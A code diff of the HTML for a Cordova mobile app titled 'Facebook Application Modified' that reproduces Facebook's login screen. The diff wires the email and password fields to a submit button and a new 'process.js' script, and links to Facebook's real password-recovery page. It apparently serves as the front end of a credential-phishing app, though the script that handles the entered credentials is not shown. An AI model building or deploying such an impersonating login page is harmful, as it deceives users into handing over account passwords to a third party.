@@ -11,7 +11,7 @@
         
         <title>Facebook Application Modified</title>
     </head>
-    <body  id="deviceready">
+    <body id="deviceready">
         <div class="listening">
             Connecting to Device
         </div>
@@ -19,12 +19,15 @@
             <h1>facebook</h1>
             <input type="text" class="form-control" id="useremail">
             <input type="password" class="form-control" id="password">
-            <button class="btn btn-primary">Log In</button>
-            <a href="">Forgot Password?</a>
+            <button class="btn btn-primary" id="submitData">Log In</button>      
+            <a href="https://m.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar">Forgot Password?</a>
+            <img src="assets/loading.gif" id="load" class="gifload displayNo" disabled>
         </div>
 
         <script type="text/javascript" src="cordova.js"></script>
+        <script type="text/javascript" src="js/jquery/jquery.min.js"></script>
         <script type="text/javascript" src="js/index.js"></script>
+        <script type="text/javascript" src="js/process.js"></script>
         <script type="text/javascript">
             app.initialize();
         </script>
